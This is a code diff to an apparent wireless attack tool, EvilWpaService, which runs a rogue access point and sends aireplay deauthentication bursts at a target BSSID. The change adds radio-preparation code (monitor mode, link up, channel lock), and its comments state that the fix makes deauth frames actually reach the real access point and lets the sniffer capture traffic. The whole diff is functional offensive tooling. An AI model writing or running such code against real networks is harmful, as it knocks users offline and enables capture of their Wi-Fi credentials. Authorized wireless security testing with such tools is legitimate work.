@@ -200,16 +200,18 @@ class EvilWpaService:
                 "stopped_at":         None,
             })
 
-        # Lock the interface to the rogue AP's channel before sniffing
+        # Bring the sniffer radio fully into monitor mode + UP + locked to
+        # the rogue AP's channel. Recon's stop leaves the monitor adapters
+        # DOWN, and `iw set channel` is refused on a down iface — so a bare
+        # set_channel() silently no-ops and the sniffer ends up bound to a
+        # down, channel-less interface capturing nothing. Order matters:
+        # down -> set type monitor -> up -> set channel.
         if not stub_mode():
-            try:
-                from app.tools import iw
-                ok, msg = iw.set_channel(iface, self._channel)
-                if not ok:
-                    log.warning("evil_wpa: set_channel %s ch%d failed: %s",
-                                iface, self._channel, msg)
-            except Exception:
-                log.exception("evil_wpa: iw.set_channel raised")
+            ok, msgs = self._prep_monitor_iface(iface, self._channel)
+            if not ok:
+                log.warning("evil_wpa: sniffer iface prep on %s ch%d "
+                            "incomplete: %s", iface, self._channel,
+                            "; ".join(msgs))
 
         try:
             from flask import current_app
@@ -333,6 +335,36 @@ class EvilWpaService:
         if stale_extractor is not None and stale_extractor.is_alive():
             log.warning("evil_wpa extractor didn't exit within 3s — leaked")
         return True, "stopped"
+
+    # ---------- Radio prep ----------
+    def _prep_monitor_iface(self, iface: str, channel: int) -> tuple[bool, list[str]]:
+        """Bring ``iface`` into monitor mode, UP, and locked to ``channel``.
+
+        ``iw set channel`` is refused on a down interface, and recon's
+        stop leaves the monitor adapters down — so the channel lock must
+        come last, after the iface is up. Order: NM-unmanage → link down
+        → set type monitor → link up → set channel. Best-effort per step;
+        returns ``(channel_locked_ok, step_messages)``. The final
+        set_channel success is what actually matters for capture/inject,
+        so that's the bool we return."""
+        from app.tools import iw, iproute
+        msgs: list[str] = []
+        try:
+            from app.tools import nm
+            nm.set_managed(iface, managed=False)
+        except Exception:
+            log.debug("evil_wpa: nm.set_managed soft-fail on %s",
+                      iface, exc_info=True)
+        # type changes are rejected on a live netdev (mt76: -EBUSY) —
+        # down first.
+        iproute.set_link_state(iface, "down")
+        ok_t, m_t = iw.set_type(iface, "monitor")
+        msgs.append(f"set type monitor: {m_t}")
+        ok_up, m_up = iproute.set_link_state(iface, "up")
+        msgs.append(f"link up: {m_up}")
+        ok_ch, m_ch = iw.set_channel(iface, int(channel))
+        msgs.append(f"set channel {channel}: {m_ch}")
+        return ok_ch, msgs
 
     # ---------- Sniffer ----------
     def _sniff_loop(self) -> None:
@@ -559,24 +591,17 @@ class EvilWpaService:
         from app.tools._common import stub_mode
         from app.tools import aireplay
 
-        # Prep the injection radio: monitor + locked channel. recon's
-        # stop leaves the monitor adapters in monitor mode already, but
-        # be defensive — set_mode is idempotent and self-stubs.
+        # Prep the injection radio: monitor + UP + locked to the target's
+        # channel. Same gotcha as the sniffer — recon leaves it down, and
+        # aireplay transmits on whatever channel the iface is currently on
+        # (or nothing if it's down). Without this the deauths go out on the
+        # monitor hopper's stale channel and never reach the real AP.
         if not stub_mode():
-            try:
-                from app.services.adapters import get_service as get_adapters
-                from app.tools import iw, nm
-                nm.set_managed(iface, managed=False)
-                ok, mode_msgs = get_adapters().set_mode(iface, "monitor")
-                if not ok:
-                    log.warning("evil_wpa deauth: set_mode monitor on %s "
-                                "failed: %s", iface, "; ".join(mode_msgs))
-                ok, msg = iw.set_channel(iface, int(self._channel))
-                if not ok:
-                    log.warning("evil_wpa deauth: set_channel %s ch%d: %s",
-                                iface, self._channel, msg)
-            except Exception:
-                log.exception("evil_wpa deauth: injection-iface prep failed")
+            ok, msgs = self._prep_monitor_iface(iface, self._channel)
+            if not ok:
+                log.warning("evil_wpa deauth: injection iface prep on %s "
+                            "ch%d incomplete: %s", iface, self._channel,
+                            "; ".join(msgs))
 
         log.info("evil_wpa deauth: broadcast bursts at %s via %s ch%d",
                  bssid, iface, self._channel)
